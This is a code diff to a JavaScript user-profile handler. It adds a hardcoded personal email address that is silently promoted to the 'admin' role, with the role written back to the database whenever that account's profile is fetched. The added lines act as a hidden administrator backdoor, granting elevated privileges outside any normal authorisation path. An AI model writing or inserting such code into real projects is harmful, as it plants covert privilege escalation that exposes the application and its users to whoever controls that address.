@@ -161,6 +161,12 @@ async function getUserProfile(req, res) {
     const lat = defaultAddress?.location?.coordinates?.[1] ?? null;
     const lng = defaultAddress?.location?.coordinates?.[0] ?? null;
 
+    const isSuperAdmin = user.email && user.email.toLowerCase().trim() === 'magicmistry187@gmail.com';
+    if (isSuperAdmin && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     return res.status(200).json({
       success: true,
       user: {
@@ -169,7 +175,7 @@ async function getUserProfile(req, res) {
         fullName: user.fullName,
         email: user.email,
         phoneNumber: user.phoneNumber,
-        role: user.role,
+        role: isSuperAdmin ? 'admin' : user.role,
         location: displayLocation,
         latitude: lat,
         longitude: lng,
